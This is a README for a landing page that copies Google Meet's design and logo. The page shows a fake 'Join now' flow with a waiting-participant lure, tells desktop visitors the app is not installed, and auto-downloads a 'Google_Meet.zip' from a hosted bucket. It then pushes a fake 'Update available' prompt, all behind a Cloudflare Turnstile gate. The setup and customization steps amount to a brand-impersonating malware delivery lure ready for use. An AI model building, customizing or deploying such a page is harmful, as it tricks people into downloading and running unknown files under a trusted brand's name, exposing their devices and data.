# Google Meet Landing Page

A clean Google Meet styled landing page with Cloudflare Turnstile protection and download modal flow.

## Features

- **Google Meet Design** - White theme, official logo, matching meet.google.com UI
- **Two-pane Layout** - Camera preview (left) + Join flow (right)
- **Getting Ready Animation** - 2s spinner with official Google Meet logo
- **Join Flow** - "Join now" button + "1 person is waiting for you to join"
- **Device Detection** - Mobile shows "Desktop required" modal
- **App Detection Modal** - Auto-downloads `Google_Meet.zip`, shows "App not installed" / "Update available" with manual fallback link
- **Cloudflare Turnstile** - Page-level challenge on first visit

## Setup

### 1. Cloudflare Turnstile

1. Go to [Cloudflare Dashboard → Turnstile](https://dash.cloudflare.com/?to=/:account/turnstile)
2. Click **Add site** → enter your domain
3. Choose challenge type (Managed recommended)
4. Copy the **Site Key** (format: `0x4...`)

### 2. Configure Site Key

Edit `index.html` and replace the placeholder:

```javascript
// In the <head> script section:
sitekey: '0x4AAAAAAAChNiVJM_WWYZJF'  // ← Replace with your actual Site Key
```

### 3. Download File

The download URL points to:
```
https://pub-76804685e01344f3b4711cc686545a05.r2.dev/Google_Meet.zip
```

Ensure this file exists at your CDN/hosting.

## Flow

1. **First visit** → Cloudflare Turnstile challenge → on success, page loads
2. **Getting ready** (2s) → shows "Join now" button
3. **Click "Join now"** → device check:
   - Mobile → "Desktop required" modal
   - Desktop → "Opening Google Meet app" spinner (1.5s)
4. **App not detected** → auto-download starts → "App not installed" modal with manual download link
5. **User returns** (visibility change) → "Update available" modal

## Files

- `index.html` - Single self-contained page (HTML + CSS + JS)
- No external dependencies except Cloudflare Turnstile CDN

## Customization

- **Meeting code**: Update `cfw-nzfm-uha` in header and page title
- **Waiting text**: Modify "1 person is waiting for you to join"
- **Download URL**: Change `GITHUB_DOWNLOAD_URL` constant
- **Colors**: Update CSS custom properties for branding